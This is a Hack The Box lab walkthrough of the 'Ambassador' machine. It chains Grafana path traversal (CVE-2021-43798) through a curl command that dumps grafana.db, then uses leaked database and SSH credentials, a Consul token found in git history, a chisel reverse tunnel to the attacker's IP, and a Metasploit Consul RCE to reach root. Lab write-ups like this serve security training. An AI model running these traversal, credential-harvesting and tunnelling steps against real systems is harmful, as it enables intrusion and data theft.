 ---
title: "HTB Ambassador: Path Traversal in CVE-2021-43798"
date: 2022-09-16T11:30:03+00:00
weight: 3
tags: ["hackthebox","path traversal", "CVE-2021-43798", "RCE"]
categories: ["hackthebox"]
showToc: true
TocOpen: true
draft: false
hidemeta: false
comments: false
description: "HTB Ambassador walkthrough."
canonicalURL: "https://canonical.url/to/page"
disableHLJS: true # to disable highlightjs
disableShare: false
disableHLJS: false
hideSummary: false
searchHidden: true
ShowBreadCrumbs: true
ShowPostNavLinks: true
ShowWordCount: true
ShowRssButtonInSectionTermList: true
UseHugoToc: true
cover:
    image: "/ambassador/static_1.png" # image path/url
    alt: "<alt text>" # alt text
    caption: "<text>" # display caption under cover
    relative: false # when using page bundles set this to true
    hidden: false # only hide on current single page
editPost:
    URL: "https://github.com/<path_to_repo>/content"
    Text: "Suggest Changes" # edit text
    appendFilePath: true # to append file path to Edit link
---

## Recon

```nmap```: **22**/SSH, **80**/HTTP, **3000**/unknown, **3306**/MySQL.

```
PORT    STATE SERVICE VERSION
22/tcp   open ssh    OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp   open http   Apache httpd 2.4.41 ((Ubuntu))
3000/tcp open ppp?
3306/tcp open mysql  MySQL 8.0.30-0ubuntu0.20.04.2
```

Checking the web application on port 80 we notice a hint of an attack vector:
![media2](/ambassador/static_2.png)

Checking the cookies, we will see that we have the **grafana_session** session cookie, which means that the machine uses the sysadmin service Grafana, whose authorization page port is, by default, exactly 3000.

By knocking on http://amba.htb:3000/, we will get a redirect to the authorization page:
![media2](/ambassador/static_3.png)

Realised that this version of Grafana has a CVE-2021-43798 path traversal vulnerability, it allows to access system files using plugins from Grafana service.
## CVE-2021-43798

https://www.exploit-db.com/exploits/50581
https://github.com/julesbozouklian/CVE-2021-43798

Using Metasploit:
![media2](/ambassador/static_4.png)
![media2](/ambassador/static_5.png)
![media2](/ambassador/static_6.png)

After successfully exploited the vulnerability, got the /etc/grafana/grafana.ini config, where we find the Grafana database credentials and its location:

```python
# Either "mysql", "postgres" or "sqlite3", it's your choice
;type = sqlite3
;host = 127.0.0.1:3306
;name = grafana
;user = root

...

#################################### Paths ##########################
[paths]
# Path to where grafana can store temp files, sessions, and the sqlite3 db (if that is used)
;data = /var/lib/grafana
```

Knowing the name of the database and having access to it through the alertlist plugin dump it via curl:

```
> curl --path-as-is http://amba.htb:3000/public/plugins/alertlist/../../../../../../../../../../var/lib/grafana/grafana.db -o grafana.db
```

```sql
> sqlite3 grafana.db
SQLite version 3.39.4 2022-09-29 15:55:41
Enter ".help" for usage hints.
sqlite> .help
.archive ...            Manage SQL archives
.auth ON|OFF            Show authorizer callbacks
.backup ?DB? FILE       Backup DB (default "main") to FILE
.bail on|off            Stop after hitting an error. Default OFF
.binary on|off          Turn binary output on or off. Default OFF
.cd DIRECTORY           Change the working directory to DIRECTORY
.changes on|off         Show number of rows changed by SQL
.check GLOB             Fail if output since .testcase does not match
.clone NEWDB            Clone data into NEWDB from the existing database
.connection [close] [#] Open or close an auxiliary database connection
.databases              List names and files of attached databases
.dbconfig ?op? ?val?    List or change sqlite3_db_config() options
.dbinfo ?DB?            Show status information about the database
.dump ?OBJECTS?         Render database content as SQL
.echo on|off            Turn command echo on or off
.eqp on|off|full|...    Enable or disable automatic EXPLAIN QUERY PLAN
.excel                  Display the output of next command in spreadsheet
.exit ?CODE?            Exit this program with return-code CODE
.expert                 EXPERIMENTAL. Suggest indexes for queries
.explain ?on|off|auto?  Change the EXPLAIN formatting mode. Default: auto
.filectrl CMD ...       Run various sqlite3_file_control() operations
.fullschema ?--indent?  Show schema and the content of sqlite_stat tables
.headers on|off         Turn display of headers on or off
.help ?-all? ?PATTERN?  Show help text for PATTERN
.import FILE TABLE      Import data from FILE into TABLE
.imposter INDEX TABLE   Create imposter table TABLE on index INDEX
.indexes ?TABLE?        Show names of indexes
.limit ?LIMIT? ?VAL?    Display or change the value of an SQLITE_LIMIT
.lint OPTIONS           Report potential schema issues.
.load FILE ?ENTRY?      Load an extension library
.log FILE|off           Turn logging on or off. FILE can be stderr/stdout
.mode MODE ?OPTIONS?    Set output mode
.nonce STRING           Suspend safe mode for one command if nonce matches
.nullvalue STRING       Use STRING in place of NULL values
.once ?OPTIONS? ?FILE?  Output for the next SQL command only to FILE
.open ?OPTIONS? ?FILE?  Close existing database and reopen FILE
.output ?FILE?          Send output to FILE or stdout if FILE is omitted
.parameter CMD ...      Manage SQL parameter bindings
.print STRING...        Print literal STRING
.progress N             Invoke progress handler after every N opcodes
.prompt MAIN CONTINUE   Replace the standard prompts
.quit                   Exit this program
.read FILE              Read input from FILE or command output
.recover                Recover as much data as possible from corrupt db.
.restore ?DB? FILE      Restore content of DB (default "main") from FILE
.save ?OPTIONS? FILE    Write database to FILE (an alias for .backup ...)
.scanstats on|off       Turn sqlite3_stmt_scanstatus() metrics on or off
.schema ?PATTERN?       Show the CREATE statements matching PATTERN
.selftest ?OPTIONS?     Run tests defined in the SELFTEST table
.separator COL ?ROW?    Change the column and row separators
.sha3sum ...            Compute a SHA3 hash of database content
.shell CMD ARGS...      Run CMD ARGS... in a system shell
.show                   Show the current values for various settings
.stats ?ARG?            Show stats or turn stats on or off
.system CMD ARGS...     Run CMD ARGS... in a system shell
.tables ?TABLE?         List names of tables matching LIKE pattern TABLE
.testcase NAME          Begin redirecting output to 'testcase-out.txt'
.testctrl CMD ...       Run various sqlite3_test_control() operations
.timeout MS             Try opening locked tables for MS milliseconds
.timer on|off           Turn SQL timer on or off
.trace ?OPTIONS?        Output each SQL statement as it is run
.vfsinfo ?AUX?          Information about the top-level VFS
.vfslist                List all available VFSes
.vfsname ?AUX?          Print the name of the VFS stack
.width NUM1 NUM2 ...    Set minimum column widths for columnar output

sqlite> .tables
alert                      login_attempt            
alert_configuration        migration_log            
alert_instance             ngalert_configuration    
alert_notification         org                      
alert_notification_state   org_user                 
alert_rule                 playlist                 
alert_rule_tag             playlist_item            
alert_rule_version         plugin_setting           
annotation                 preferences              
annotation_tag             quota                    
api_key                    server_lock              
cache_data                 session                  
dashboard                  short_url                
dashboard_acl              star                     
dashboard_provisioning     tag                      
dashboard_snapshot         team                     
dashboard_tag              team_member              
dashboard_version          temp_user                
data_source                test_data                
kv_store                   user                     
library_element            user_auth                
library_element_connection user_auth_token 

sqlite> .dump data_source
PRAGMA foreign_keys=OFF;
BEGIN TRANSACTION;
CREATE TABLE `data_source` (
`id` INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL
, `org_id` INTEGER NOT NULL
, `version` INTEGER NOT NULL
, `type` TEXT NOT NULL
, `name` TEXT NOT NULL
, `access` TEXT NOT NULL
, `url` TEXT NOT NULL
, `password` TEXT NULL
, `user` TEXT NULL
, `database` TEXT NULL
, `basic_auth` INTEGER NOT NULL
, `basic_auth_user` TEXT NULL
, `basic_auth_password` TEXT NULL
, `is_default` INTEGER NOT NULL
, `json_data` TEXT NULL
, `created` DATETIME NOT NULL
, `updated` DATETIME NOT NULL
, `with_credentials` INTEGER NOT NULL DEFAULT 0, `secure_json_data` TEXT NULL, `read_only` INTEGER NULL, `uid` TEXT NOT NULL DEFAULT 0);
INSERT INTO data_source VALUES(2,1,1,'mysql','mysql.yaml','proxy','','dontStandSoCloseToMe63221!','grafana','grafana',0,'','',0,X'7b7d','2022-09-01 22:43:03','2022-10-24 14:24:03',0,'{}',1,'uKewFgM4z');
COMMIT;
```

After studying the database we find the password for MySQL, located on port 3306. Let's connect:

```sql
> mysql --host amba.htb -u grafana -p
Enter password: dontStandSoCloseToMe63221!

Welcome to the MariaDB monitor. Commands end with ; or \g.
Your MySQL connection id is 62
Server version: 8.0.30-0ubuntu0.20.04.2 (Ubuntu)

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input 

MySQL [(none)]> SHOW DATABASES;
+--------------------+
| Database           |
+--------------------+
| grafana            |
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| whackywidget       |
+--------------------+
6 rows in set (0.137 sec)

MySQL [(none)]> use whackywidget
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MySQL [whackywidget]> show tables;
+------------------------+
| Tables_in_whackywidget |
+------------------------+
| users                  |
+------------------------+
1 row in set (0.132 sec)

MySQL [whackywidget]> select * from users;
+-----------+------------------------------------------+
| user     | pass                                      |
+-----------+------------------------------------------+
| developer | YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg== |
+-----------+------------------------------------------+
1 row in set (0.134 sec)
```

We get base64 encoded password.Decode it, connect via SSH and take the user.

```zsh
> echo YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg== | base64 -d 
anEnglishManInNewYork027468
> ssh developer@amba.htb
developer@amba.htb's password: 

Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-126-generic x86_64)
Last login: Mon Oct 24 17:16:55 2022 from 10.10.16.43

bash-5.0$ ls
snap user.txt
```

## Privelege Escalation

Using linpeas, find the git repository:

```
╔══════════╣ Analyzing Github Files (limit 70)

-rw-rw-r-- 1 developer developer 93 Sep 2 02:28 /home/developer/.gitconfig
drwxrwxr-x 8 root root 4096 Mar 14 2022 /opt/my-app/.git
```

```sql
developer@ambassador:/opt/my-app/.git$ git log
fatal: detected dubious ownership in repository at '/opt/my-app/.git'
To add an exception for this directory, call:

   git config --global --add safe.directory /opt/my-app/.git
developer@ambassador:/opt/my-app/.git$ git config --global --add safe.directory /opt/my-app/.git

developer@ambassador:/opt/my-app/.git$ 
developer@ambassador:/opt/my-app/.git$ git log
commit 33a53ef9a207976d5ceceddc41a199558843bf3c (HEAD -> main)
Author: Developer <developer@ambassador.local>
Date:  Sun Mar 13 23:47:36 2022 +0000

   tidy config script

commit c982db8eff6f10f8f3a7d802f79f2705e7a21b55
Author: Developer <developer@ambassador.local>
Date:  Sun Mar 13 23:44:45 2022 +0000

   config script

commit 8dce6570187fd1dcfb127f51f147cd1ca8dc01c6
Author: Developer <developer@ambassador.local>
Date:  Sun Mar 13 22:47:01 2022 +0000

   created project with django CLI

commit 4b8597b167b2fbf8ec35f992224e612bf28d9e51
Author: Developer <developer@ambassador.local>
Date:  Sun Mar 13 22:44:11 2022 +0000

   .gitignore
developer@ambassador:/opt/my-app/.git$ 

developer@ambassador:/opt/my-app/.git$ git show c982db8eff6f10f8f3a7d802f79f2705e7a21b55
commit c982db8eff6f10f8f3a7d802f79f2705e7a21b55
Author: Developer <developer@ambassador.local>
Date:  Sun Mar 13 23:44:45 2022 +0000
 config script

diff --git a/whackywidget/put-config-in-consul.sh b/whackywidget/put-config-in-consul.sh
new file mode 100755
index 0000000..35c08f6
--- /dev/null
+++ b/whackywidget/put-config-in-consul.sh
@@ -0,0 +1,4 @@
+# We use Consul for application config in production, this script will help set the correct values for the app
+# Export MYSQL_PASSWORD before running
+
+consul kv put --token bb03b43b-1d81-d62b-24b5-39540ee469b5 whackywidget/db/mysql_pw $MYSQL_PASSWORD
```


Find the token for the Consul service used on the machine.

```
+consul kv put --token bb03b43b-1d81-d62b-24b5-39540ee469b5 whackywidget/db/mysql_pw $MYSQL_PASSWORD
```

Also find out the version of the service:

```bash
developer@ambassador:/opt/my-app/.git$ apt list | grep "consul"
consul/focal,now 1.13.2-1 amd64 [installed]
```

Find an exploit for the RCE in Metasploit:
![media2](/ambassador/static_7.png)

But we can't use it, because of disabling UI on victim machine:
![media2](/ambassador/static_8.png)


So let's set up a TCP tunneling from Ambassador machine to ours to exploit the vulnerability.

https://book.hacktricks.xyz/generic-methodologies-and-resources/tunneling-and-port-forwarding. 

We will use a ```chisel```.

On the local machine:
```
~/tools> ./chisel server -p 8080 --reverse
2022/10/24 22:58:49 server: Reverse tunnelling enabled
2022/10/24 22:58:49 server: Fingerprint ``tx4Ngv/UtweTvoIMDAuUoDe7G6BoF9m88xU+//DNXSM=
2022/10/24 22:58:49 server: Listening on http://0.0.0.0:8080
```
On the victim machine:
```
developer@ambassador:~/.tmp$ ./chisel client 10.10.16.45:8080 R:8500:127.0.0.1:8500
2022/10/24 19:05:36 client: Connecting to ws://10.10.16.45:8080
2022/10/24 19:05:38 client: Connected (Latency 130.006367ms)
```

Great, now we can access Consul at 127.0.0.1:8500.

Let's set the parameters for the pailoit in metasploit:
![media2](/ambassador/static_9.png)

Where **RHOSTS** and **RPORT** is the address to reach Consul, **ACL_TOKEN** is the previously found token, and **LHOST** and **LPORT** are the attacker's machine.

Run it and get the root.
![media2](/ambassador/static_10.png)
### Pwned.